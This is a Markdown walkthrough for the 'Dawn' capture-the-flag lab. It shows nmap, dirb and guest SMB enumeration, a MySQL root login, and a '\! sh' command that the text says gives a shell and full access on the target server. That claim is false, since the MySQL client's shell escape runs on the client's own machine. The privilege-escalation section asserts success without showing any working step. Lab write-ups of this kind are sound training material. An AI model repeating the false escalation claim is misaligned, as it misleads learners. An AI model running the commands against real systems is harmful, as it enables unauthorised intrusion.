---

# Dawn Walkthrough

## 📝 Description

**Dawn** is a penetration testing lab that simulates a real-world scenario with exposed Samba, HTTP, and MySQL services. This walkthrough covers initial reconnaissance, service enumeration, SMB login attempts, and privilege escalation using MySQL exploitation techniques. The lab is suitable for beginners to intermediate-level CTF and red team learners.

---

## 📌 Target Info

* **Lab Name:** Dawn
* **Target IP:** `192.168.239.11`

---

## 🔍 Initial Reconnaissance

### Nmap Scan

```bash
nmap -v -sC -sV 192.168.239.11
```

### Discovered Services

| Port | Service | Version                 |
| ---- | ------- | ----------------------- |
| 80   | HTTP    | Apache 2.4.38 (Debian)  |
| 139  | SMB     | Samba smbd 3.X - 4.X    |
| 445  | SMB     | Samba smbd 4.9.5-Debian |
| 3306 | MySQL   | MariaDB 10.3.15         |

---

## 🌐 HTTP Enumeration

```bash
dirb http://192.168.239.11
```

* **Found:** `/logs` directory

---

## 📂 SMB Enumeration

```bash
smbclient //192.168.239.11/itdept
```

* Connected as guest (no credentials required)
* No useful files were found

---

## 🐚 MySQL Access

Attempted login to MySQL:

```bash
mysql -h 192.168.239.11 -u root -p
```

Once inside MySQL, executed:

```sql
\! sh
```

This spawns a **shell** directly from the MySQL client, allowing command execution on the server.

---

## 🧨 Privilege Escalation

* Direct shell access from MySQL confirms possible privilege escalation.
* Exploit chain ends in full system access.

---

## 🎯 Final Result

* Shell access achieved via MySQL escape
* Lab completed ✅

---

## 💬 Repo Description (for GitHub)

> **Dawn Lab Walkthrough**
> A CTF-style penetration testing guide for a vulnerable machine named **Dawn**, covering enumeration via HTTP, SMB, and MySQL, with an unusual privilege escalation through shell escape in MySQL. Great for red team practice and MySQL exploitation learning.

---
